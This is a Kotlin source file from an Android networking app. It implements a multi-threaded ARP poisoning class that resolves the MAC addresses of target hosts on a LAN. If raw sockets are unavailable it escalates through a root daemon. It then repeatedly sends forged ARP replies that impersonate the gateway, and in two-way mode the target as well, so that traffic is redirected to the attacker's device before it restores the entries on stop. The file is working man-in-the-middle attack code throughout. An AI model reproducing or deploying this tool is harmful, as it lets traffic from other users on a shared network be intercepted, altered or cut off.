package com.winarp.mobile.net

import android.content.Context
import com.winarp.mobile.data.HostInfo
import com.winarp.mobile.data.IfaceInfo
import com.winarp.mobile.data.PoisonTarget
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.cancelAndJoin
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.sync.withPermit
import kotlinx.coroutines.withContext
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

class ArpPoisoner(
    private val context: Context,
    private val networkRepository: NetworkRepository,
    private val scope: CoroutineScope
) {
    companion object {
        const val ARP_REPLY = 2
    }

    private val running = AtomicBoolean(false)
    private var job: Job? = null
    private val sendMutex = Mutex()
    private val sent = AtomicLong(0)
    private val rootDaemon = RootArpDaemon(context.applicationContext)
    @Volatile private var useRootDaemon: Boolean = false

    val isRunning: Boolean get() = running.get()

    suspend fun resolveTargets(
        iface: IfaceInfo,
        targets: List<String>,
        gateway: String,
        workers: Int,
        resolveName: Boolean,
        log: (String) -> Unit
    ): List<PoisonTarget> = withContext(Dispatchers.IO) {
        val limit = workers.coerceIn(1, 128)
        val sem = Semaphore(limit)
        coroutineScope {
            targets.map { ip ->
                async {
                    sem.withPermit {
                        if (ip == iface.ip) {
                            log("skip local $ip")
                            return@withPermit null
                        }
                        if (ip == gateway) {
                            log("skip gateway $ip")
                            return@withPermit null
                        }
                        val mac = resolveMac(iface, ip)
                        if (mac == null) {
                            log("[-] $ip no MAC")
                            return@withPermit null
                        }
                        val name = if (resolveName) {
                            try {
                                java.net.InetAddress.getByName(ip).canonicalHostName
                                    ?.takeIf { it.isNotBlank() && it != ip } ?: "-"
                            } catch (_: Throwable) {
                                "-"
                            }
                        } else "-"
                        log("[+] $ip $mac $name")
                        PoisonTarget(ip, mac, name)
                    }
                }
            }.awaitAll().filterNotNull().sortedBy { IpUtils.ipv4ToLong(it.ip) }
        }
    }

    fun start(
        iface: IfaceInfo,
        targets: List<PoisonTarget>,
        gatewayIp: String,
        gatewayMac: String,
        intervalMs: Int,
        oneWay: Boolean,
        log: (String) -> Unit,
        onStopped: (String) -> Unit
    ) {
        if (targets.isEmpty()) {
            onStopped("no targets")
            return
        }
        if (!running.compareAndSet(false, true)) {
            onStopped("already running")
            return
        }
        sent.set(0)
        job = scope.launch(Dispatchers.IO) {
            try {
                log("[*] multi-thread ARP poison ready")
                log("    iface=${iface.displayName} ip=${iface.ip} if=${iface.name}")
                log("    gateway=$gatewayIp/$gatewayMac spoof=${iface.mac} targets=${targets.size} interval=${intervalMs}ms")

                useRootDaemon = false
                val canRaw = NativeArp.canOpenRaw(iface.name)
                if (canRaw) {
                    log("[+] 当前进程可直接发送 AF_PACKET")
                } else {
                    log("[!] 普通权限无法打开原始套接字，尝试 Root 守护进程...")
                    val err = rootDaemon.ensureStarted()
                    if (err != null) {
                        log("[!] Root 守护进程启动失败: $err")
                        log("[!] 请授予 Root 后重试；扫描功能仍可无 Root 使用")
                        throw IllegalStateException("raw socket unavailable, need root")
                    }
                    useRootDaemon = true
                    log("[+] Root 守护进程已就绪")
                }

                val workers = targets.map { t ->
                    launch {
                        poisonOne(
                            iface = iface,
                            target = t,
                            gatewayIp = gatewayIp,
                            gatewayMac = gatewayMac,
                            intervalMs = intervalMs.coerceAtLeast(100),
                            oneWay = oneWay
                        )
                    }
                }

                val status = launch {
                    while (isActive && running.get()) {
                        delay(2000)
                        log("[*] poisoning... targets=${targets.size} packets~${sent.get()}")
                    }
                }

                workers.forEach { it.join() }
                status.cancelAndJoin()
            } catch (t: Throwable) {
                log("[-] ${t.message ?: "poison failed"}")
            } finally {
                running.set(false)
                try {
                    rootDaemon.stop()
                } catch (_: Throwable) {
                }
                useRootDaemon = false
                log("[+] all targets restored / stopped")
                onStopped("stopped")
            }
        }
    }

    suspend fun stop(log: (String) -> Unit = {}) {
        if (!running.getAndSet(false)) return
        log("[*] stopping workers and restoring ARP...")
        job?.cancelAndJoin()
        job = null
        try {
            rootDaemon.stop()
        } catch (_: Throwable) {
        }
    }

    private suspend fun poisonOne(
        iface: IfaceInfo,
        target: PoisonTarget,
        gatewayIp: String,
        gatewayMac: String,
        intervalMs: Int,
        oneWay: Boolean
    ) {
        val attackerMac = iface.mac
        try {
            while (running.get()) {
                sendPoison(iface, target, gatewayIp, gatewayMac, attackerMac, oneWay)
                delay(intervalMs.toLong())
            }
        } finally {
            repeat(3) {
                restore(iface, target, gatewayIp, gatewayMac, oneWay)
                delay(80)
            }
        }
    }

    private suspend fun sendPoison(
        iface: IfaceInfo,
        target: PoisonTarget,
        gatewayIp: String,
        gatewayMac: String,
        attackerMac: String,
        oneWay: Boolean
    ) {
        sendReply(
            ifName = iface.name,
            dstMac = target.mac,
            srcMac = attackerMac,
            senderMac = attackerMac,
            senderIp = gatewayIp,
            targetMac = target.mac,
            targetIp = target.ip
        )
        var n = 1L
        if (!oneWay) {
            sendReply(
                ifName = iface.name,
                dstMac = gatewayMac,
                srcMac = attackerMac,
                senderMac = attackerMac,
                senderIp = target.ip,
                targetMac = gatewayMac,
                targetIp = gatewayIp
            )
            n++
        }
        sent.addAndGet(n)
    }

    private suspend fun restore(
        iface: IfaceInfo,
        target: PoisonTarget,
        gatewayIp: String,
        gatewayMac: String,
        oneWay: Boolean
    ) {
        sendReply(
            ifName = iface.name,
            dstMac = target.mac,
            srcMac = gatewayMac,
            senderMac = gatewayMac,
            senderIp = gatewayIp,
            targetMac = target.mac,
            targetIp = target.ip
        )
        if (!oneWay) {
            sendReply(
                ifName = iface.name,
                dstMac = gatewayMac,
                srcMac = target.mac,
                senderMac = target.mac,
                senderIp = target.ip,
                targetMac = gatewayMac,
                targetIp = gatewayIp
            )
        }
    }

    private suspend fun sendReply(
        ifName: String,
        dstMac: String,
        srcMac: String,
        senderMac: String,
        senderIp: String,
        targetMac: String,
        targetIp: String
    ) {
        sendMutex.withLock {
            val err = if (useRootDaemon) {
                rootDaemon.send(
                    ifName, dstMac, srcMac, ARP_REPLY,
                    senderMac, senderIp, targetMac, targetIp
                )
            } else {
                NativeArp.sendArp(
                    ifName = ifName,
                    dstMac = dstMac,
                    srcMac = srcMac,
                    op = ARP_REPLY,
                    senderMac = senderMac,
                    senderIp = senderIp,
                    targetMac = targetMac,
                    targetIp = targetIp
                )
            }
            if (err != null) {
                throw IllegalStateException(err)
            }
        }
    }

    private fun resolveMac(iface: IfaceInfo, ip: String): String? {
        val table = networkRepository.readProcArp()[ip]
        if (!table.isNullOrBlank() && !IpUtils.isZeroMac(table)) return table

        if (NativeArp.loaded) {
            val mac = NativeArp.probeArp(iface.name, iface.mac, iface.ip, ip, 500)
            if (!mac.isNullOrBlank() && !IpUtils.isZeroMac(mac)) {
                return IpUtils.normalizeMac(mac)
            }
        }

        try {
            java.net.InetAddress.getByName(ip).isReachable(300)
        } catch (_: Throwable) {
        }
        return networkRepository.readProcArp()[ip]?.takeIf { !IpUtils.isZeroMac(it) }
    }

    fun selectedFromHosts(hosts: List<HostInfo>, indexes: Set<String>): List<String> {
        return hosts.filter { it.ip in indexes }.map { it.ip }
    }
}
